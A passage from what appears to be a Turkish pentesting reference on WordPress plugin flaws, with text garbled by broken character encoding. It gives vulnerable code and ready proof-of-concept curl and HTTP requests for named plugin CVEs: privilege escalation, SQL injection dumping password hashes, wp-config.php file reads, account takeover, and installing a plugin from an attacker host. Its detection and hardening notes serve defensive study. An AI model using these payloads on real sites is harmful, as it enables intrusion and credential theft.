* `check_ajax_referer()` ve `current_user_can()`/`is_user_logged_in()` yokluÄŸu.

---

### Yetki yÃ¼kseltme: eskimiÅŸ rol geri yÃ¼kleme ve yetkilendirme eksikliÄŸi (ASE "View Admin as Role")

BirÃ§ok eklenti, orijinal rol(leri) user meta'da saklayÄ±p daha sonra geri yÃ¼kleyebilmek iÃ§in "view as role" veya geÃ§ici rol deÄŸiÅŸtirme Ã¶zelliÄŸi uygular. EÄŸer geri yÃ¼kleme yolu yalnÄ±zca istek parametrelerine (Ã¶rn. `$_REQUEST['reset-for']`) ve eklentinin tuttuÄŸu bir listeye dayanÄ±yor, capability kontrolleri ve geÃ§erli bir nonce doÄŸrulamasÄ± yoksa bu dikey yetki yÃ¼kseltmesine dÃ¶nÃ¼ÅŸÃ¼r.

GerÃ§ek dÃ¼nyadan bir Ã¶rnek Admin and Site Enhancements (ASE) eklentisinde (â‰¤ 7.6.2.1) bulundu. Reset dalÄ±, kullanÄ±cÄ± adÄ± dahili bir dizi `$options['viewing_admin_as_role_are']` iÃ§inde yer alÄ±yorsa `reset-for=<username>` bazÄ±nda rolleri geri yÃ¼klÃ¼yordu, ancak mevcut rolleri kaldÄ±rÄ±p user meta `_asenha_view_admin_as_original_roles`'den kaydedilmiÅŸ rolleri tekrar eklemeden Ã¶nce ne `current_user_can()` kontrolÃ¼ ne de nonce doÄŸrulamasÄ± yapÄ±yordu:
```php
// Simplified vulnerable pattern
if ( isset( $_REQUEST['reset-for'] ) ) {
$reset_for_username = sanitize_text_field( $_REQUEST['reset-for'] );
$usernames = get_option( ASENHA_SLUG_U, [] )['viewing_admin_as_role_are'] ?? [];

if ( in_array( $reset_for_username, $usernames, true ) ) {
$u = get_user_by( 'login', $reset_for_username );
foreach ( $u->roles as $role ) { $u->remove_role( $role ); }
$orig = (array) get_user_meta( $u->ID, '_asenha_view_admin_as_original_roles', true );
foreach ( $orig as $r ) { $u->add_role( $r ); }
}
}
```
Neden sÃ¶mÃ¼rÃ¼lebilir

- Sunucu tarafÄ± yetkilendirmesi olmadan `$_REQUEST['reset-for']` ve bir eklenti seÃ§eneÄŸine gÃ¼venir.
- EÄŸer bir kullanÄ±cÄ± daha Ã¶nce yÃ¼ksek ayrÄ±calÄ±klarÄ±nÄ± `_asenha_view_admin_as_original_roles` iÃ§inde kaydetmiÅŸse ve daha sonra yetkileri dÃ¼ÅŸÃ¼rÃ¼lmÃ¼ÅŸse, sÄ±fÄ±rlama yoluna eriÅŸerek bunlarÄ± geri alabilir.
- BazÄ± daÄŸÄ±tÄ±mlarda, kimliÄŸi doÄŸrulanmÄ±ÅŸ herhangi bir kullanÄ±cÄ± `viewing_admin_as_role_are` iÃ§inde hÃ¢lÃ¢ bulunan baÅŸka bir kullanÄ±cÄ± adÄ± iÃ§in sÄ±fÄ±rlamayÄ± tetikleyebilir (yetkilendirme hatasÄ±).

Ä°stismar (Ã¶rnek)
```bash
# While logged in as the downgraded user (or any auth user able to trigger the code path),
# hit any route that executes the role-switcher logic and include the reset parameter.
# The plugin uses $_REQUEST, so GET or POST works. The exact route depends on the plugin hooks.
curl -s -k -b 'wordpress_logged_in=...' \
'https://victim.example/wp-admin/?reset-for=<your_username>'
```
ZayÄ±f yapÄ±landÄ±rmalarda bu, mevcut rolleri kaldÄ±rÄ±r ve kaydedilmiÅŸ orijinal rolleri (Ã¶r. `administrator`) tekrar ekler; bu da etkili ÅŸekilde ayrÄ±calÄ±klarÄ± yÃ¼kseltir.

Detection checklist

- KullanÄ±cÄ± meta alanÄ±nda â€œoriginal rolesâ€i saklayan rolâ€‘deÄŸiÅŸtirme Ã¶zelliklerini ara (Ã¶r. `_asenha_view_admin_as_original_roles`).
- Åu tÃ¼r sÄ±fÄ±rlama/geri yÃ¼kleme yollarÄ±nÄ± belirle:
- KullanÄ±cÄ± adlarÄ±nÄ± `$_REQUEST` / `$_GET` / `$_POST` Ã¼zerinden okuyan.
- Rolleri `add_role()` / `remove_role()` ile, `current_user_can()` ve `wp_verify_nonce()` / `check_admin_referer()` olmadan deÄŸiÅŸtiren.
- Yetkilendirmeyi, iÅŸlemi yapan kullanÄ±cÄ±nÄ±n yetenekleri yerine bir eklenti seÃ§enek dizisine (Ã¶r. `viewing_admin_as_role_are`) dayandÄ±ran.

---

### Kimlik doÄŸrulamasÄ± olmayan ayrÄ±calÄ±k yÃ¼kseltmesi via cookieâ€‘trusted user switching on public init (Service Finder â€œsf-bookingâ€)

BazÄ± eklentiler userâ€‘switching yardÄ±mcÄ±larÄ±nÄ± public `init` hook'una baÄŸlar ve kimliÄŸi istemci kontrollÃ¼ bir Ã§erezden tÃ¼retir. EÄŸer kod `wp_set_auth_cookie()`'u kimlik doÄŸrulamasÄ±nÄ±, capability ve geÃ§erli bir nonce'u doÄŸrulamadan Ã§aÄŸÄ±rÄ±yorsa, herhangi bir kimliÄŸi doÄŸrulanmamÄ±ÅŸ ziyaretÃ§i rastgele bir kullanÄ±cÄ± ID'si olarak zorla oturum aÃ§tÄ±rabilir.

Tipik savunmasÄ±z desen (Service Finder Bookings â‰¤ 6.1'den basitleÅŸtirilmiÅŸ):
```php
function service_finder_submit_user_form(){
if ( isset($_GET['switch_user']) && is_numeric($_GET['switch_user']) ) {
$user_id = intval( sanitize_text_field($_GET['switch_user']) );
service_finder_switch_user($user_id);
}
if ( isset($_GET['switch_back']) ) {
service_finder_switch_back();
}
}
add_action('init', 'service_finder_submit_user_form');

function service_finder_switch_back() {
if ( isset($_COOKIE['original_user_id']) ) {
$uid = intval($_COOKIE['original_user_id']);
if ( get_userdata($uid) ) {
wp_set_current_user($uid);
wp_set_auth_cookie($uid);  // ğŸ”¥ sets auth for attacker-chosen UID
do_action('wp_login', get_userdata($uid)->user_login, get_userdata($uid));
setcookie('original_user_id', '', time() - 3600, '/');
wp_redirect( admin_url('admin.php?page=candidates') );
exit;
}
wp_die('Original user not found.');
}
wp_die('No original user found to switch back to.');
}
```
Neden istismar edilebilir

- Herkese aÃ§Ä±k `init` hook, handler'Ä±n kimlik doÄŸrulanmamÄ±ÅŸ kullanÄ±cÄ±lar tarafÄ±ndan eriÅŸilebilir olmasÄ±nÄ± saÄŸlar (`is_user_logged_in()` korumasÄ± yok).
- Kimlik, istemci tarafÄ±ndan deÄŸiÅŸtirilebilen bir cookie olan `original_user_id` deÄŸerinden tÃ¼retilir.
- DoÄŸrudan `wp_set_auth_cookie($uid)` Ã§aÄŸrÄ±sÄ±, istekte bulunanÄ± herhangi bir capability/nonce kontrolÃ¼ olmadan o kullanÄ±cÄ± olarak oturum aÃ§tÄ±rÄ±r.

Ä°stismar (kimlik doÄŸrulanmamÄ±ÅŸ)
```http
GET /?switch_back=1 HTTP/1.1
Host: victim.example
Cookie: original_user_id=1
User-Agent: PoC
Connection: close
```
---
### WordPress/plugin CVE'leri iÃ§in WAF hususlarÄ±

Genel edge/server WAF'larÄ± geniÅŸ desenler (SQLi, XSS, LFI) iÃ§in ayarlanmÄ±ÅŸtÄ±r. BirÃ§ok yÃ¼ksek etkili WordPress/plugin aÃ§Ä±ÄŸÄ±, uygulamaya Ã¶zgÃ¼ mantÄ±k/auth hatalarÄ±dÄ±r ve motor WordPress yollarÄ±nÄ± ve plugin semantiklerini anlamadÄ±kÃ§a zararsÄ±z trafik gibi gÃ¶rÃ¼nÃ¼r.

SaldÄ±rÄ± notlarÄ±

- Plugin'e Ã¶zgÃ¼ endpoint'leri temiz payloadlarla hedefleyin: `admin-ajax.php?action=...`, `wp-json/<namespace>/<route>`, custom file handlers, shortcodes.
- Ã–nce kimlik doÄŸrulama gerektirmeyen yollarÄ± test edin (AJAX `nopriv`, REST with permissive `permission_callback`, public shortcodes). VarsayÄ±lan payloadlar genellikle obfuscation olmadan baÅŸarÄ±lÄ± olur.
- Tipik yÃ¼ksek etkili durumlar: privilege escalation (broken access control), arbitrary file upload/download, LFI, open redirect.

Savunma notlarÄ±

- Plugin CVE'lerini korumak iÃ§in genel WAF imzalarÄ±na gÃ¼venmeyin. Uygulama katmanÄ±, aÃ§Ä±ÄŸa Ã¶zgÃ¼ sanal yamalar uygulayÄ±n veya hÄ±zlÄ±ca gÃ¼ncelleyin.
- Kodda negatif regex filtreleri yerine pozitif gÃ¼venlik kontrollerini tercih edin (capabilities, nonces, strict input validation).

## WordPress KorumasÄ±

### DÃ¼zenli GÃ¼ncellemeler

WordPress, plugins ve temalarÄ±n gÃ¼ncel olduÄŸundan emin olun. AyrÄ±ca wp-config.php iÃ§inde otomatik gÃ¼ncellemelerin etkinleÅŸtirildiÄŸini doÄŸrulayÄ±n:
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
AyrÄ±ca, **sadece gÃ¼venilir WordPress eklentilerini ve temalarÄ±nÄ± yÃ¼kleyin**.

### GÃ¼venlik Eklentileri

- [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
- [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
- [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **DiÄŸer Ã–neriler**

- VarsayÄ±lan **admin** kullanÄ±cÄ±sÄ±nÄ± kaldÄ±rÄ±n
- **GÃ¼Ã§lÃ¼ parolalar** ve **2FA** kullanÄ±n
- KullanÄ±cÄ±larÄ±n **izinlerini** periyodik olarak **gÃ¶zden geÃ§irin**
- Brute Force saldÄ±rÄ±larÄ±nÄ± Ã¶nlemek iÃ§in **giriÅŸ denemelerini sÄ±nÄ±rlandÄ±rÄ±n**
- **`wp-admin.php`** dosyasÄ±nÄ±n adÄ±nÄ± deÄŸiÅŸtirin ve eriÅŸime yalnÄ±zca dahili aÄŸdan veya belirli IP adreslerinden izin verin.


### Yetersiz doÄŸrulama nedeniyle kimlik doÄŸrulamasÄ± gerektirmeyen SQL Injection (WP Job Portal <= 2.3.2)

WP Job Portal recruitment plugin, en nihayetinde `modules/category/model.php::validateFormData()` iÃ§inde aÅŸaÄŸÄ±daki zafiyetli kodu Ã§alÄ±ÅŸtÄ±ran **savecategory** gÃ¶revini aÃ§Ä±ÄŸa Ã§Ä±kardÄ±:
```php
$category  = WPJOBPORTALrequest::getVar('parentid');
$inquery   = ' ';
if ($category) {
$inquery .= " WHERE parentid = $category ";   // <-- direct concat âœ—
}
$query  = "SELECT max(ordering)+1 AS maxordering FROM "
. wpjobportal::$_db->prefix . "wj_portal_categories " . $inquery; // executed later
```
Bu kod parÃ§asÄ±nÄ±n yol aÃ§tÄ±ÄŸÄ± problemler:

1. **TemizlenmemiÅŸ kullanÄ±cÄ± giriÅŸi** â€“ `parentid` doÄŸrudan HTTP isteÄŸinden geliyor.
2. **WHERE koÅŸulu iÃ§inde string birleÅŸtirme** â€“ `is_numeric()` / `esc_sql()` / prepared statement yok.
3. **Kimlik doÄŸrulama gerektirmeyen eriÅŸilebilirlik** â€“ action `admin-post.php` Ã¼zerinden Ã§alÄ±ÅŸtÄ±rÄ±lsa da, mevcut tek kontrol bir **CSRF nonce** (`wp_verify_nonce()`), ki bu herhangi bir ziyaretÃ§i tarafÄ±ndan kÄ±sa kodu `[wpjobportal_my_resumes]` iÃ§eren aÃ§Ä±k bir sayfadan alÄ±nabilir.

#### Ä°stismar

1. Yeni bir nonce al:
```bash
curl -s https://victim.com/my-resumes/ | grep -oE 'name="_wpnonce" value="[a-f0-9]+' | cut -d'"' -f4
```
2. `parentid`'i kÃ¶tÃ¼ye kullanarak keyfi SQL enjekte et:
```bash
curl -X POST https://victim.com/wp-admin/admin-post.php \
-d 'task=savecategory' \
-d '_wpnonce=<nonce>' \
-d 'parentid=0 OR 1=1-- -' \
-d 'cat_title=pwn' -d 'id='
```
YanÄ±t, enjekte edilen sorgunun sonucunu aÃ§Ä±ÄŸa Ã§Ä±karÄ±r veya veritabanÄ±nÄ± deÄŸiÅŸtirir; bu da SQLi'yi kanÄ±tlar.


### Unauthenticated Arbitrary File Download / Path Traversal (WP Job Portal <= 2.3.2)

BaÅŸka bir task, **downloadcustomfile**, ziyaretÃ§ilerin path traversal yoluyla diskteki **herhangi bir dosyayÄ±** indirmesine izin veriyordu. ZayÄ±f nokta `modules/customfield/model.php::downloadCustomUploadedFile()` iÃ§inde bulunuyor:
```php
$file = $path . '/' . $file_name;
...
echo $wp_filesystem->get_contents($file); // raw file output
```
`$file_name` saldÄ±rgan tarafÄ±ndan kontrol ediliyor ve **temizleme uygulanmadan** birleÅŸtiriliyor. Yine, tek engel **CSRF nonce** olup bu nonce Ã¶zgeÃ§miÅŸ sayfasÄ±ndan alÄ±nabiliyor.

#### Ä°stismar
```bash
curl -G https://victim.com/wp-admin/admin-post.php \
--data-urlencode 'task=downloadcustomfile' \
--data-urlencode '_wpnonce=<nonce>' \
--data-urlencode 'upload_for=resume' \
--data-urlencode 'entity_id=1' \
--data-urlencode 'file_name=../../../wp-config.php'
```
Sunucu `wp-config.php` iÃ§eriÄŸiyle yanÄ±t verir, leaking DB credentials ve auth keys.

## Unauthenticated account takeover via Social Login AJAX fallback (Jobmonster Theme <= 4.7.9)

BirÃ§ok tema/eklenti, admin-ajax.php Ã¼zerinden eriÅŸilebilen "social login" yardÄ±mcÄ±larÄ± ile gelir. EÄŸer bir unauthenticated AJAX action (wp_ajax_nopriv_...) saÄŸlayÄ±cÄ± verisi eksik olduÄŸunda istemci tarafÄ±ndan saÄŸlanan tanÄ±mlayÄ±cÄ±lara gÃ¼venip ardÄ±ndan wp_set_auth_cookie() Ã§aÄŸÄ±rÄ±yorsa, bu tam bir authentication bypass'a dÃ¶nÃ¼ÅŸÃ¼r.

Tipik hatalÄ± desen (basitleÅŸtirilmiÅŸ)
```php
public function check_login() {
// ... request parsing ...
switch ($_POST['using']) {
case 'fb':     /* set $user_email from verified Facebook token */ break;
case 'google': /* set $user_email from verified Google token   */ break;
// other providers ...
default: /* unsupported/missing provider â€“ execution continues */ break;
}

// FALLBACK: trust POSTed "id" as email if provider data missing
$user_email = !empty($user_email)
? $user_email
: (!empty($_POST['id']) ? esc_attr($_POST['id']) : '');

if (empty($user_email)) {
wp_send_json(['status' => 'not_user']);
}

$user = get_user_by('email', $user_email);
if ($user) {
wp_set_auth_cookie($user->ID, true); // ğŸ”¥ logs requester in as that user
wp_send_json(['status' => 'success', 'message' => 'Login successfully.']);
}
wp_send_json(['status' => 'not_user']);
}
// add_action('wp_ajax_nopriv_<social_login_action>', [$this, 'check_login']);
```
Neden sÃ¶mÃ¼rÃ¼lebilir

- Kimlik doÄŸrulanmamÄ±ÅŸ eriÅŸim admin-ajax.php Ã¼zerinden (wp_ajax_nopriv_â€¦ action).
- Durum deÄŸiÅŸikliÄŸinden Ã¶nce nonce/capability kontrolleri yok.
- OAuth/OpenID saÄŸlayÄ±cÄ± doÄŸrulamasÄ± eksik; varsayÄ±lan branch saldÄ±rgan girdisini kabul ediyor.
- get_user_by('email', $_POST['id']) followed by wp_set_auth_cookie($uid) istekte bulunanÄ± herhangi bir mevcut e-posta adresi olarak yetkilendiriyor.

Ä°stismar (kimlik doÄŸrulanmamÄ±ÅŸ)

- Ã–nkoÅŸullar: saldÄ±rgan /wp-admin/admin-ajax.php adresine eriÅŸebiliyor ve geÃ§erli bir kullanÄ±cÄ± e-postasÄ±nÄ± biliyor/tahmin ediyor.
- provider'Ä± desteklenmeyen bir deÄŸere ayarlayÄ±n (veya hiÃ§ gÃ¶ndermeyin) bÃ¶ylece varsayÄ±lan branch'e girilir ve id=<victim_email> gÃ¶nderilir.
```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: victim.tld
Content-Type: application/x-www-form-urlencoded

action=<vulnerable_social_login_action>&using=bogus&id=admin%40example.com
```

```bash
curl -i -s -X POST https://victim.tld/wp-admin/admin-ajax.php \
-d "action=<vulnerable_social_login_action>&using=bogus&id=admin%40example.com"
```
Expected success indicators

- HTTP 200 with JSON body like {"status":"success","message":"Login successfully."}.
- Set-Cookie: wordpress_logged_in_* for the victim user; subsequent requests are authenticated.

Finding the action name

- Inspect the theme/plugin for add_action('wp_ajax_nopriv_...', '...') registrations in social login code (e.g., framework/add-ons/social-login/class-social-login.php).
- Grep for wp_set_auth_cookie(), get_user_by('email', ...) inside AJAX handlers.

Detection checklist

- Web logs showing unauthenticated POSTs to /wp-admin/admin-ajax.php with the social-login action and id=<email>.
- 200 responses with the success JSON immediately preceding authenticated traffic from the same IP/User-Agent.

Hardening

- Do not derive identity from client input. Only accept emails/IDs originating from a validated provider token/ID.
- Require CSRF nonces and capability checks even for login helpers; avoid registering wp_ajax_nopriv_ unless strictly necessary.
- Validate and verify OAuth/OIDC responses server-side; reject missing/invalid providers (no fallback to POST id).
- Consider temporarily disabling social login or virtually patching at the edge (block the vulnerable action) until fixed.

Patched behaviour (Jobmonster 4.8.0)

- Removed the insecure fallback from $_POST['id']; $user_email must originate from verified provider branches in switch($_POST['using']).

## Unauthenticated privilege escalation via REST token/key minting on predictable identity (OttoKit/SureTriggers â‰¤ 1.0.82)

BazÄ± pluginler, Ã§aÄŸÄ±ranÄ±n yeteneklerini doÄŸrulamadan yeniden kullanÄ±labilir â€œconnection keysâ€ veya tokenlar mint eden REST endpointleri aÃ§Ä±ÄŸa Ã§Ä±karÄ±r. EÄŸer route sadece tahmin edilebilir bir Ã¶zniteliÄŸe gÃ¶re (Ã¶rn. username) authenticate ediyorsa ve keyâ€™i kullanÄ±cÄ±/oturum ile capability checks ile baÄŸlamÄ±yorsa, herhangi bir unauthenticated attacker bir key mint edebilir ve ayrÄ±calÄ±klÄ± iÅŸlemleri tetikleyebilir (admin hesap oluÅŸturma, plugin actions â†’ RCE).

- Vulnerable route (example): sure-triggers/v1/connection/create-wp-connection
- Flaw: accepts a username, issues a connection key without current_user_can() or a strict permission_callback
- Impact: full takeover by chaining the minted key to internal privileged actions

PoC â€“ mint a connection key and use it
```bash
# 1) Obtain key (unauthenticated). Exact payload varies per plugin
curl -s -X POST "https://victim.tld/wp-json/sure-triggers/v1/connection/create-wp-connection" \
-H 'Content-Type: application/json' \
--data '{"username":"admin"}'
# â†’ {"key":"<conn_key>", ...}

# 2) Call privileged plugin action using the minted key (namespace/route vary per plugin)
curl -s -X POST "https://victim.tld/wp-json/sure-triggers/v1/users" \
-H 'Content-Type: application/json' \
-H 'X-Connection-Key: <conn_key>' \
--data '{"username":"pwn","email":"p@t.ld","password":"p@ss","role":"administrator"}'
```
Neden sÃ¶mÃ¼rÃ¼lebilir
- DÃ¼ÅŸÃ¼k entropili kimlik kanÄ±tÄ± (username) ile korunmuÅŸ veya permission_callback eksik olan hassas REST rota
- Yetki (capability) denetimi yok; oluÅŸturulan anahtar evrensel bir baypas olarak kabul ediliyor

Tespit kontrol listesi
- Eklenti kodunda ÅŸu ifadeyi grep edin: register_rest_route(..., [ 'permission_callback' => '__return_true' ])
- Ä°stemci tarafÄ±ndan saÄŸlanan kimlik (username/email) temel alÄ±narak token/anahtar veren ve bunu doÄŸrulanmÄ±ÅŸ bir kullanÄ±cÄ±ya veya capability'ye baÄŸlamayan herhangi bir rota
- Sunucu tarafÄ± capability kontrolleri olmadan oluÅŸturulan token/anahtarÄ± kabul eden sonraki rotalarÄ± arayÄ±n

GÃ¼Ã§lendirme
- Herhangi bir ayrÄ±calÄ±klÄ± REST rota iÃ§in: gerekli capability'i dayatan bir permission_callback gerektirin (current_user_can() kullanarak)
- Ä°stemci tarafÄ±ndan saÄŸlanan kimlikten uzun Ã¶mÃ¼rlÃ¼ anahtarlar oluÅŸturmayÄ±n; gerekiyorsa kimlik doÄŸrulama sonrasÄ± kÄ±sa Ã¶mÃ¼rlÃ¼, kullanÄ±cÄ±ya baÄŸlÄ± token'lar verin ve kullanÄ±mda capability'leri yeniden kontrol edin
- Ã‡aÄŸÄ±ranÄ±n kullanÄ±cÄ± baÄŸlamÄ±nÄ± doÄŸrulayÄ±n (wp_set_current_user tek baÅŸÄ±na yeterli deÄŸildir) ve !is_user_logged_in() || !current_user_can(<cap>) olan istekleri reddedin

---

## Nonce gate misuse â†’ kimlik doÄŸrulanmamÄ±ÅŸ rastgele eklenti kurulumu (FunnelKit Automations â‰¤ 3.5.3)

Nonces CSRF'i Ã¶nler, yetkilendirmeyi deÄŸil. EÄŸer kod bir nonce geÃ§iÅŸini yeÅŸil Ä±ÅŸÄ±k olarak deÄŸerlendirip ayrÄ±calÄ±klÄ± iÅŸlemler iÃ§in capability kontrollerini atlÄ±yorsa (Ã¶r. install/activate plugins), kimliÄŸi doÄŸrulanmamÄ±ÅŸ saldÄ±rganlar zayÄ±f bir nonce gereksinimini karÅŸÄ±layÄ±p arka kapÄ±lÄ± veya zafiyetli bir eklenti yÃ¼kleyerek RCE'ye ulaÅŸabilir.

- Vulnerable path: plugin/install_and_activate
- Flaw: weak nonce hash check; no current_user_can('install_plugins'|'activate_plugins') once nonce â€œpassesâ€
- Impact: full compromise via arbitrary plugin install/activation

PoC (ÅŸekli eklentiye baÄŸlÄ±dÄ±r; sadece Ã¶rnek amaÃ§lÄ±)
```bash
curl -i -s -X POST https://victim.tld/wp-json/<fk-namespace>/plugin/install_and_activate \
-H 'Content-Type: application/json' \
--data '{"_nonce":"<weak-pass>","slug":"hello-dolly","source":"https://attacker.tld/mal.zip"}'
```
Detection checklist
- REST/AJAX handlers that modify plugins/themes with only wp_verify_nonce()/check_admin_referer() and no capability check
- Any code path that sets $skip_caps = true after nonce validation

Hardening
- Always treat nonces as CSRF tokens only; enforce capability checks regardless of nonce state
- Require current_user_can('install_plugins') and current_user_can('activate_plugins') before reaching installer code
- Reject unauthenticated access; avoid exposing nopriv AJAX actions for privileged flows

---

## Kimlik doÄŸrulamasÄ± olmayan SQLi via s search parameter in depicter-* actions (Depicter Slider â‰¤ 3.6.1)

Multiple depicter-* actions consumed the s (search) parameter and concatenated it into SQL queries without parameterization.

- Parameter: s (search)
- Flaw: direct string concatenation in WHERE/LIKE clauses; no prepared statements/sanitization
- Impact: database exfiltration (users, hashes), lateral movement

PoC
```bash
# Replace action with the affected depicter-* handler on the target
curl -G "https://victim.tld/wp-admin/admin-ajax.php" \
--data-urlencode 'action=depicter_search' \
--data-urlencode "s=' UNION SELECT user_login,user_pass FROM wp_users-- -"
```
Detection checklist
- Grep ile depicter-* action handlers'Ä± ve SQL iÃ§inde $_GET['s'] veya $_POST['s']'in doÄŸrudan kullanÄ±mÄ±nÄ± arayÄ±n
- $wpdb->get_results()/query()'e geÃ§irilen ve s ile birleÅŸtirilen Ã¶zel sorgularÄ± gÃ¶zden geÃ§irin

Hardening
- $wpdb->prepare() veya wpdb placeholders'larÄ±nÄ± her zaman kullanÄ±n; beklenmeyen metakarakterleri sunucu tarafÄ±nda reddedin
- s iÃ§in sÄ±kÄ± bir allowlist ekleyin ve beklenen karakter seti/uzunluÄŸa normalize edin

---

## Unauthenticated Local File Inclusion via unvalidated template/file path (Kubio AI Page Builder â‰¤ 2.5.1)

Bir template parametresinde normalizasyon/sÄ±nÄ±rlama uygulanmadan saldÄ±rgan kontrollÃ¼ yollarÄ±n kabul edilmesi, rastgele yerel dosyalarÄ±n okunmasÄ±na izin verir ve includable PHP/log dosyalarÄ± Ã§alÄ±ÅŸma zamanÄ±na dahil edilirse bazen kod yÃ¼rÃ¼tÃ¼lmesine yol aÃ§abilir.

- Parameter: __kubio-site-edit-iframe-classic-template
- Flaw: normalizasyon/allowlisting yok; traversal'a izin veriliyor
- Impact: gizli bilgilerin ifÅŸasÄ± (wp-config.php), belirli ortamlarda potansiyel RCE (log poisoning, includable PHP)

PoC â€“ wp-config.php oku
```bash
curl -i "https://victim.tld/?__kubio-site-edit-iframe-classic-template=../../../../wp-config.php"
```
Tespit kontrol listesi
- Realpath() ile containment kontrolÃ¼ olmadan istek yollarÄ±nÄ± include()/require()/read sink'lerine birleÅŸtiren herhangi bir iÅŸleyici
- Niyet edilen templates dizininin dÄ±ÅŸÄ±na Ã§Ä±kan traversal desenleri (../) arayÄ±n

SertleÅŸtirme
- Ä°zin verilen (allowlisted) ÅŸablonlarÄ± zorlayÄ±n; realpath() ile Ã§Ã¶zÃ¼n ve str_starts_with(realpath(file), realpath(allowed_base)) ÅŸartÄ±nÄ± uygulayÄ±n
- Girdiyi normalize edin; traversal dizilerini ve mutlak yollarÄ± reddedin; sanitize_file_name()'Ä± yalnÄ±zca dosya adlarÄ± iÃ§in kullanÄ±n (tam yollar iÃ§in deÄŸil)


## Kaynaklar

- [Unauthenticated Arbitrary File Deletion Vulnerability in Litho Theme](https://patchstack.com/articles/unauthenticated-arbitrary-file-delete-vulnerability-in-litho-the/)
- [Multiple Critical Vulnerabilities Patched in WP Job Portal Plugin](https://patchstack.com/articles/multiple-critical-vulnerabilities-patched-in-wp-job-portal-plugin/)
- [Rare Case of Privilege Escalation in ASE Plugin Affecting 100k+ Sites](https://patchstack.com/articles/rare-case-of-privilege-escalation-in-ase-plugin-affecting-100k-sites/)
- [ASE 7.6.3 changeset â€“ delete original roles on profile update](https://plugins.trac.wordpress.org/changeset/3211945/admin-site-enhancements/tags/7.6.3/classes/class-view-admin-as-role.php?old=3208295&old_path=admin-site-enhancements%2Ftags%2F7.6.2%2Fclasses%2Fclass-view-admin-as-role.php)
- [Hosting security tested: 87.8% of vulnerability exploits bypassed hosting defenses](https://patchstack.com/articles/hosting-security-tested-87-percent-of-vulnerability-exploits-bypassed-hosting-defenses/)
- [WooCommerce Payments â‰¤ 5.6.1 â€“ Unauth privilege escalation via trusted header (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/woocommerce-payments/vulnerability/wordpress-woocommerce-payments-plugin-5-6-1-unauthenticated-privilege-escalation-vulnerability)
- [Hackers exploiting critical WordPress WooCommerce Payments bug](https://www.bleepingcomputer.com/news/security/hackers-exploiting-critical-wordpress-woocommerce-payments-bug/)
- [Unpatched Privilege Escalation in Service Finder Bookings Plugin](https://patchstack.com/articles/unpatched-privilege-escalation-in-service-finder-bookings-plugin/)
- [Service Finder Bookings privilege escalation â€“ Patchstack DB entry](https://patchstack.com/database/wordpress/plugin/sf-booking/vulnerability/wordpress-service-finder-booking-6-0-privilege-escalation-vulnerability)
- [Unauthenticated Broken Authentication Vulnerability in WordPress Jobmonster Theme](https://patchstack.com/articles/unauthenticated-broken-authentication-vulnerability-in-wordpress-jobmonster-theme/)
- [Q3 2025â€™s most exploited WordPress vulnerabilities and how RapidMitigate blocked them](https://patchstack.com/articles/q3-2025s-most-exploited-wordpress-vulnerabilities-and-how-patchstacks-rapidmitigate-blocked-them/)
- [OttoKit (SureTriggers) â‰¤ 1.0.82 â€“ Privilege Escalation (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/suretriggers/vulnerability/wordpress-suretriggers-1-0-82-privilege-escalation-vulnerability)
- [FunnelKit Automations â‰¤ 3.5.3 â€“ Unauthenticated arbitrary plugin installation (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/wp-marketing-automations/vulnerability/wordpress-recover-woocommerce-cart-abandonment-newsletter-email-marketing-marketing-automation-by-funnelkit-plugin-3-5-3-missing-authorization-to-unauthenticated-arbitrary-plugin-installation-vulnerability)
- [Depicter Slider â‰¤ 3.6.1 â€“ Unauthenticated SQLi via s parameter (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/depicter/vulnerability/wordpress-depicter-slider-plugin-3-6-1-unauthenticated-sql-injection-via-s-parameter-vulnerability)
- [Kubio AI Page Builder â‰¤ 2.5.1 â€“ Unauthenticated LFI (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/kubio/vulnerability/wordpress-kubio-ai-page-builder-plugin-2-5-1-unauthenticated-local-file-inclusion-vulnerability)

{{#include ../../banners/hacktricks-training.md}}
